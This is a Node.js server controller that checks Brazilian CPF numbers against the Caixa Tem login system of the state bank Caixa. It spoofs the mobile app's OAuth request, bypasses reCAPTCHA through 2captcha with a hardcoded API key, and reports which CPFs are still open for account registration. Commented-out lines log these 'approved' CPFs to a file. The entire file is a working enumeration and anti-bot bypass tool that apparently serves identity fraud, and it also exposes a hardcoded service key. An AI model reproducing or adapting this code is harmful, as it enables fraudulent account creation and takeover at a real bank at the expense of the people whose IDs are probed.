const axios = require("axios");
const fs = require("fs");
const cheerio = require("cheerio");
const qs = require("qs");

class CheckController {
	async validar(req, res) {
		const { nick, pass, val } = req.body;
		const cpf = val;

		if (nick === "4tzpasscode" && pass === "senha4tzpasscode") {
			await axios
				.get(
					"https://login2.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=&state=KtlC7ZaQYSx1YSBbFEb3Zw&scope=offline_access&code_challenge=Gh46C4diOCpyEU71lpFAl2PP8HdCrpuEWvx_1Mpckd0&code_challenge_method=S256&deviceId=9146908e-24aa-3bc3-abaa-f8d53e46ef28&so=Android&app=br.gov.caixa.tem%3Bvertical%3Dhttps%3A%2F%2Fmobilidade.cloud.caixa.gov.br%3Bruntime%3Dmfp&origem=mf&nivel=12",
					{
						headers: {
							"content-type": "application/x-www-form-urlencoded",
							origin: "https://login2.caixa.gov.br",
							referer:
								"https://login2.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=&state=KtlC7ZaQYSx1YSBbFEb3Zw&scope=offline_access&code_challenge=Gh46C4diOCpyEU71lpFAl2PP8HdCrpuEWvx_1Mpckd0&code_challenge_method=S256&deviceId=9146908e-24aa-3bc3-abaa-f8d53e46ef28&so=Android&app=br.gov.caixa.tem%3Bvertical%3Dhttps%3A%2F%2Fmobilidade.cloud.caixa.gov.br%3Bruntime%3Dmfp&origem=mf&nivel=12",
							"sec-fetch-dest": "document",
							"sec-fetch-mode": "navigate",
							"sec-fetch-site": "same-origin",
							"sec-fetch-user": "?1",
							"upgrade-insecure-requests": 1,
							"user-agent":
								"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36 Edg/84.0.522.52",
						},
					}
				)
				.then(async (res) => {
					var cheche = cheerio.load(res.data);
					var url = cheche("#form-login").attr("action");
					var sessionId = cheche("#sessionId").val();
					var captchaCode = "";

					const resolveCaptcha = async (
						url,
						codeCaptchaRe,
						tentativa
					) => {
						const googleKey =
							"6LdgpMAUAAAAANUA_FHf77k19riaFWCT3zt3umDo";
						const captchaKey = "df162110d575d426a01c2aef9083c691";

						if (codeCaptchaRe == undefined) {
							var codeCaptcha = await axios.get(
								`https://2captcha.com/in.php?key=${captchaKey}&method=userrecaptcha&googlekey=${googleKey}&pageurl=${url}`
							);
						}

						//await timeout(5000);

						var googleCode = await axios.get(
							`https://2captcha.com/res.php?key=${captchaKey}&action=get&id=${
								codeCaptchaRe == undefined
									? codeCaptcha.data.substring(3)
									: codeCaptchaRe
							}`
						);

						if (googleCode.data == "CAPCHA_NOT_READY") {
							await resolveCaptcha(
								url,
								codeCaptchaRe == undefined
									? codeCaptcha.data.substring(3)
									: codeCaptchaRe,
								tentativa + 1
							);
						} else {
							captchaCode = googleCode.data.substring(3);
						}
					};

					await resolveCaptcha(url, undefined, 1);

					const requestBody = {
						f10: "",
						fingerprint: "866a2d4301b708439a585bf507bfa108",
						step: "1",
						situacaoGeolocalizacao: "",
						latitude: "",
						longitude: "",
						username: cpf,
						"g-recaptcha-response": captchaCode,
					};

					// site key: 6LdgpMAUAAAAANUA_FHf77k19riaFWCT3zt3umDo
					// 2captcha key: df162110d575d426a01c2aef9083c691

					axios
						.post(url, qs.stringify(requestBody), {
							headers: {
								"user-agent":
									"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36 Edg/84.0.522.52",
								"Content-Type":
									"application/x-www-form-urlencoded",
								Cookie: `AUTH_SESSION_ID=${sessionId}.AZRJPCAPLLX040; KC_RESTART=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIyOGYxZTFlZC02ZDAxLTRkMDAtYWEzMS1lM2VlY2MzY2RhYmIifQ.eyJjaWQiOiJjbGktbW9iLW5ibSIsInB0eSI6Im9wZW5pZC1jb25uZWN0IiwicnVyaSI6ImJyLmdvdi5jYWl4YS50ZW06L29hdXRoMkNhbGxiYWNrIiwiYWN0IjoiQVVUSEVOVElDQVRFIiwibm90ZXMiOnsiaXNzIjoiaHR0cHM6Ly9sb2dpbjIuY2FpeGEuZ292LmJyL2F1dGgvcmVhbG1zL2ludGVybmV0IiwicmVzcG9uc2VfdHlwZSI6ImNvZGUiLCJjb2RlX2NoYWxsZW5nZV9tZXRob2QiOiJTMjU2IiwibG9naW5faGludCI6IiIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX2FwcCI6ImJyLmdvdi5jYWl4YS50ZW07dmVydGljYWw9aHR0cHM6Ly9tb2JpbGlkYWRlLmNsb3VkLmNhaXhhLmdvdi5icjtydW50aW1lPW1mcCIsInNjb3BlIjoib2ZmbGluZV9hY2Nlc3MiLCJjbGllbnRfcmVxdWVzdF9wYXJhbV9kZXZpY2VJZCI6IjkxNDY5MDhlLTI0YWEtM2JjMy1hYmFhLWY4ZDUzZTQ2ZWYyOCIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX3NvIjoiQW5kcm9pZCIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX25pdmVsIjoiMTIiLCJzdGF0ZSI6Ikt0bEM3WmFRWVN4MVlTQmJGRWIzWnciLCJyZWRpcmVjdF91cmkiOiJici5nb3YuY2FpeGEudGVtOi9vYXV0aDJDYWxsYmFjayIsImNsaWVudF9yZXF1ZXN0X3BhcmFtX29yaWdlbSI6Im1mIiwiY29kZV9jaGFsbGVuZ2UiOiJHaDQ2QzRkaU9DcHlFVTcxbHBGQWwyUFA4SGRDcnB1RVd2eF8xTXBja2QwIn19.izfrvHwe1YSGXFxm-lNR4XrtVRhzKz6-C-83Ldb0pKE; ROUTEID=.AZRJPCAPLLX006`,
							},
						})
						.then((resLiberacao) => {
							var result = cheerio.load(resLiberacao.data);
							var error = result(".alert-error").html();
							var message = result(".alert-error").html();
							if (
								error == null ||
								!error ||
								error === "" ||
								message.includes(
									"regularizar o seu acesso. Procure uma"
								)
							) {
								return res.json({ status: "Já cadastrado" });

								// console.log(
								// 	`\x1b[37mCPF: \x1b[31m${cpf} \x1b[37m=>\x1b[33m Já cadastrado`
								// );
							} else {
								// fs.appendFileSync(
								// 	"Aprovadas\\Cpfs Aprovados.txt",
								// 	`CPF: ${cpf} => Cadastro Liberado\n`
								// );
								return res.json({
									status: "Cadastro Liberado",
								});
								// console.log(
								// 	`\x1b[37mCPF: \x1b[32m${cpf} \x1b[37m=>\x1b[33m Cadastro Liberado`
								// );
							}
						})
						.catch((resulterr) => {
							return res.json({
								status: "Error",
							});
							console.log(
								`\x1b[37mCPF: \x1b[31m${cpf} \x1b[37m=>\x1b[36m Erro desconhecido`
							);
						});
				});
		} else {
			return res.status(400).json({
				error: "::4Tz:: -- Parece que você não pode fazer isso :(",
			});
		}
	}
}

module.exports = new CheckController();
